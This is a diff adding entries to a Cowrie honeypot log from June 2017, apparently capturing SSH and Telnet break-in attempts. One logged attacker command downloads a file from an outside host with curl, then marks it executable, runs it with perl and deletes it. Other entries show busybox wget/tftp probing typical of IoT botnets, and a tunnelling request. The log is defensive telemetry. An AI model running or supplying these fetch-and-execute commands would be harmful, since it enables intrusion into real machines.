@@ -6269,3 +6269,111 @@
 2017-06-09T20:51:59+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,15950,108.34.41.75] 'musicbot' trying auth 'password'
 2017-06-09T20:51:59+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,15950,108.34.41.75] login attempt: 123
 2017-06-09T20:51:59+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,15950,108.34.41.75] login return, expect: [musicbot/musicbot]
+2017-06-09T20:52:01+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,15950,108.34.41.75] login attempt [musicbot/musicbot] succeeded
+2017-06-09T20:52:03+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,15950,108.34.41.75] 'musicbot' authenticated with 'password'
+2017-06-09T20:52:03+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,15950,108.34.41.75] starting service 'ssh-connection'
+2017-06-09T20:52:03+0000 [CowrieTelnetTransport,33894,178.47.120.191] Closing TTY Log: log/tty/20170609-204959-None-33894i.log after 123 seconds
+2017-06-09T20:52:03+0000 [CowrieTelnetTransport,33894,178.47.120.191] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-09T20:52:03+0000 [CowrieTelnetTransport,33894,178.47.120.191] Connection lost after 128 seconds
+2017-06-09T20:52:03+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:58503 (10.8.41.81:2222) [session: b66e3f1a]
+2017-06-09T20:52:03+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,15950,108.34.41.75] got channel 'session' request
+2017-06-09T20:52:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15950,108.34.41.75] channel open
+2017-06-09T20:52:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15950,108.34.41.75] executing command "uname -a; cd /tmp ; curl -O http://digginberlin.com/1 ; chmod +x 1 ; perl 1 ; rm -rf 1"
+2017-06-09T20:52:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15950,108.34.41.75] Opening TTY Log: log/tty/20170609-205203-1ff0e729-0e.log
+2017-06-09T20:52:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15950,108.34.41.75] CMD: uname -a; cd /tmp ; curl -O http://digginberlin.com/1 ; chmod +x 1 ; perl 1 ; rm -rf 1
+2017-06-09T20:52:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15950,108.34.41.75] Command found: uname -a
+2017-06-09T20:52:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15950,108.34.41.75] Command found: cd /tmp
+2017-06-09T20:52:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15950,108.34.41.75] Command found: curl -O http://digginberlin.com/1
+2017-06-09T20:52:03+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://digginberlin.com/1>
+2017-06-09T20:52:03+0000 [HTTPPageDownloader,client] Not storing duplicate content b642303a78aa8dc09e07f91f44a268c0198cdcf06c3124b98930af7f115bcd7e
+2017-06-09T20:52:03+0000 [HTTPPageDownloader,client] Downloaded URL (http://digginberlin.com/1) with SHA-256 b642303a78aa8dc09e07f91f44a268c0198cdcf06c3124b98930af7f115bcd7e to dl/b642303a78aa8dc09e07f91f44a268c0198cdcf06c3124b98930af7f115bcd7e
+2017-06-09T20:52:03+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/1
+2017-06-09T20:52:03+0000 [HTTPPageDownloader,client] Command found: perl /tmp/1
+2017-06-09T20:52:03+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/1
+2017-06-09T20:52:03+0000 [HTTPPageDownloader,client] exitCode: 0
+2017-06-09T20:52:03+0000 [HTTPPageDownloader,client] sending request 'exit-status'
+2017-06-09T20:52:03+0000 [HTTPPageDownloader,client] Not storing duplicate content b642303a78aa8dc09e07f91f44a268c0198cdcf06c3124b98930af7f115bcd7e
+2017-06-09T20:52:03+0000 [HTTPPageDownloader,client] Saved redir contents with SHA-256 b642303a78aa8dc09e07f91f44a268c0198cdcf06c3124b98930af7f115bcd7e to dl/b642303a78aa8dc09e07f91f44a268c0198cdcf06c3124b98930af7f115bcd7e
+2017-06-09T20:52:03+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170609-205203-1ff0e729-0e.log after 0 seconds
+2017-06-09T20:52:03+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-09T20:52:03+0000 [HTTPPageDownloader,client] sending close 0
+2017-06-09T20:52:03+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://digginberlin.com/1>
+2017-06-09T20:52:04+0000 [HoneyPotSSHTransport,15950,108.34.41.75] Got remote error, code 11
+	reason: Normal Shutdown, Thank you for playing
+2017-06-09T20:52:04+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15950,108.34.41.75] remote close
+2017-06-09T20:52:04+0000 [HoneyPotSSHTransport,15950,108.34.41.75] avatar musicbot logging out
+2017-06-09T20:52:04+0000 [HoneyPotSSHTransport,15950,108.34.41.75] connection lost
+2017-06-09T20:52:04+0000 [HoneyPotSSHTransport,15950,108.34.41.75] Connection lost after 6 seconds
+2017-06-09T20:52:07+0000 [HoneyPotSSHTransport,15951,113.195.145.52] Remote SSH version: SSH-2.0-PUTTY
+2017-06-09T20:52:07+0000 [HoneyPotSSHTransport,15951,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-09T20:52:07+0000 [HoneyPotSSHTransport,15951,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-09T20:52:07+0000 [HoneyPotSSHTransport,15951,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-09T20:52:07+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 83.26.74.119:52933 (10.8.41.81:2223) [session: TT33896]
+2017-06-09T20:52:08+0000 [CowrieTelnetTransport,33896,83.26.74.119] first time for 83.26.74.119, need: 1
+2017-06-09T20:52:08+0000 [CowrieTelnetTransport,33896,83.26.74.119] login attempt: 1
+2017-06-09T20:52:10+0000 [CowrieTelnetTransport,33896,83.26.74.119] login attempt [guest/guest] succeeded
+2017-06-09T20:52:12+0000 [CowrieTelnetTransport,33896,83.26.74.119] Opening TTY Log: log/tty/20170609-205212-None-33896i.log
+2017-06-09T20:52:12+0000 [CowrieTelnetTransport,33896,83.26.74.119] Warning: state changed and new state returned
+2017-06-09T20:52:12+0000 [HoneyPotSSHTransport,15951,113.195.145.52] NEW KEYS
+2017-06-09T20:52:12+0000 [CowrieTelnetTransport,33896,83.26.74.119] CMD: enable
+2017-06-09T20:52:12+0000 [CowrieTelnetTransport,33896,83.26.74.119] Command found: enable 
+2017-06-09T20:52:12+0000 [CowrieTelnetTransport,33896,83.26.74.119] Reading txtcmd from "txtcmds/bin/enable"
+2017-06-09T20:52:12+0000 [CowrieTelnetTransport,33896,83.26.74.119] CMD: system
+2017-06-09T20:52:12+0000 [CowrieTelnetTransport,33896,83.26.74.119] Command not found: system
+2017-06-09T20:52:12+0000 [CowrieTelnetTransport,33896,83.26.74.119] CMD: shell
+2017-06-09T20:52:12+0000 [CowrieTelnetTransport,33896,83.26.74.119] Command not found: shell
+2017-06-09T20:52:13+0000 [CowrieTelnetTransport,33896,83.26.74.119] CMD: sh
+2017-06-09T20:52:13+0000 [CowrieTelnetTransport,33896,83.26.74.119] Command found: sh 
+2017-06-09T20:52:13+0000 [CowrieTelnetTransport,33896,83.26.74.119] CMD:  /bin/busybox wget; /bin/busybox 81c46036wget; /bin/busybox echo -ne '\x0181c46036\x7f'; /bin/busybox printf '\00281c46036\177'; /bin/echo -ne '\x0381c46036\x7f'; /usr/bin/printf '\00481c46036\177'; /bin/busybox tftp; /bin/busybox 81c46036tftp;
+2017-06-09T20:52:13+0000 [CowrieTelnetTransport,33896,83.26.74.119] Command found: /bin/busybox wget
+2017-06-09T20:52:13+0000 [CowrieTelnetTransport,33896,83.26.74.119] Command found: wget
+2017-06-09T20:52:13+0000 [CowrieTelnetTransport,33896,83.26.74.119] Command found: /bin/busybox 81c46036wget
+2017-06-09T20:52:13+0000 [CowrieTelnetTransport,33896,83.26.74.119] Command found: /bin/busybox echo -ne '\x0181c46036\x7f'
+2017-06-09T20:52:13+0000 [CowrieTelnetTransport,33896,83.26.74.119] Command found: echo -ne '\x0181c46036\x7f'
+2017-06-09T20:52:13+0000 [CowrieTelnetTransport,33896,83.26.74.119] Command found: /bin/busybox printf '\00281c46036\177'
+2017-06-09T20:52:13+0000 [CowrieTelnetTransport,33896,83.26.74.119] Command found: /bin/echo -ne '\x0381c46036\x7f'
+2017-06-09T20:52:13+0000 [CowrieTelnetTransport,33896,83.26.74.119] Command not found: /usr/bin/printf '\00481c46036\177'
+2017-06-09T20:52:13+0000 [CowrieTelnetTransport,33896,83.26.74.119] Command found: /bin/busybox tftp
+2017-06-09T20:52:13+0000 [CowrieTelnetTransport,33896,83.26.74.119] Command found: tftp
+2017-06-09T20:52:13+0000 [CowrieTelnetTransport,33896,83.26.74.119] Command found: /bin/busybox 81c46036tftp
+2017-06-09T20:52:13+0000 [CowrieTelnetTransport,33896,83.26.74.119] CMD:  /bin/busybox dd if=/bin/busybox bs=22 count=1 || /bin/busybox cat /bin/busybox
+2017-06-09T20:52:13+0000 [CowrieTelnetTransport,33896,83.26.74.119] Command found: /bin/busybox dd if=/bin/busybox bs=22 count=1
+2017-06-09T20:52:13+0000 [CowrieTelnetTransport,33896,83.26.74.119] Command found: /bin/busybox cat /bin/busybox
+2017-06-09T20:52:13+0000 [CowrieTelnetTransport,33896,83.26.74.119] Command found: cat /bin/busybox
+2017-06-09T20:52:19+0000 [HoneyPotSSHTransport,15951,113.195.145.52] starting service 'ssh-userauth'
+2017-06-09T20:52:19+0000 [HoneyPotSSHTransport,15951,113.195.145.52] Got remote error, code 11
+	reason: 
+2017-06-09T20:52:19+0000 [HoneyPotSSHTransport,15951,113.195.145.52] connection lost
+2017-06-09T20:52:19+0000 [HoneyPotSSHTransport,15951,113.195.145.52] Connection lost after 16 seconds
+2017-06-09T20:52:21+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,15944,91.230.47.81] got channel 'direct-tcpip' request
+2017-06-09T20:52:21+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,15944,91.230.47.81] direct-tcp connection request to 107.6.167.194:80 from localhost:5556
+2017-06-09T20:52:27+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15944,91.230.47.81] remote eof
+2017-06-09T20:52:27+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15944,91.230.47.81] remote close
+2017-06-09T20:52:27+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15944,91.230.47.81] sending close 0
+2017-06-09T20:52:29+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:44517 (10.8.41.81:2222) [session: d2945726]
+2017-06-09T20:52:44+0000 [CowrieTelnetTransport,33895,112.248.96.57] Closing TTY Log: log/tty/20170609-205041-None-33895i.log after 122 seconds
+2017-06-09T20:52:44+0000 [CowrieTelnetTransport,33895,112.248.96.57] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-09T20:52:44+0000 [CowrieTelnetTransport,33895,112.248.96.57] Connection lost after 129 seconds
+2017-06-09T20:52:51+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:47721 (10.8.41.81:2222) [session: 92f00c2d]
+2017-06-09T20:52:53+0000 [HoneyPotSSHTransport,15953,113.195.145.52] Remote SSH version: SSH-2.0-PUTTY
+2017-06-09T20:52:53+0000 [HoneyPotSSHTransport,15953,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-09T20:52:53+0000 [HoneyPotSSHTransport,15953,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-09T20:52:53+0000 [HoneyPotSSHTransport,15953,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-09T20:52:54+0000 [HoneyPotSSHTransport,15953,113.195.145.52] NEW KEYS
+2017-06-09T20:52:55+0000 [HoneyPotSSHTransport,15953,113.195.145.52] starting service 'ssh-userauth'
+2017-06-09T20:52:56+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,15953,113.195.145.52] 'root' trying auth 'none'
+2017-06-09T20:52:59+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,15953,113.195.145.52] 'root' authenticated with 'none'
+2017-06-09T20:52:59+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,15953,113.195.145.52] starting service 'ssh-connection'
+2017-06-09T20:52:59+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:60166 (10.8.41.81:2222) [session: 6ff51d09]
+2017-06-09T20:53:01+0000 [HoneyPotSSHTransport,15954,113.195.145.52] Remote SSH version: SSH-2.0-PUTTY
+2017-06-09T20:53:01+0000 [HoneyPotSSHTransport,15954,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-09T20:53:01+0000 [HoneyPotSSHTransport,15954,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-09T20:53:01+0000 [HoneyPotSSHTransport,15954,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-09T20:53:01+0000 [HoneyPotSSHTransport,15953,113.195.145.52] Got remote error, code 11
+	reason: 
+2017-06-09T20:53:01+0000 [HoneyPotSSHTransport,15953,113.195.145.52] avatar root logging out
+2017-06-09T20:53:01+0000 [HoneyPotSSHTransport,15953,113.195.145.52] connection lost
+2017-06-09T20:53:01+0000 [HoneyPotSSHTransport,15953,113.195.145.52] Connection lost after 10 seconds
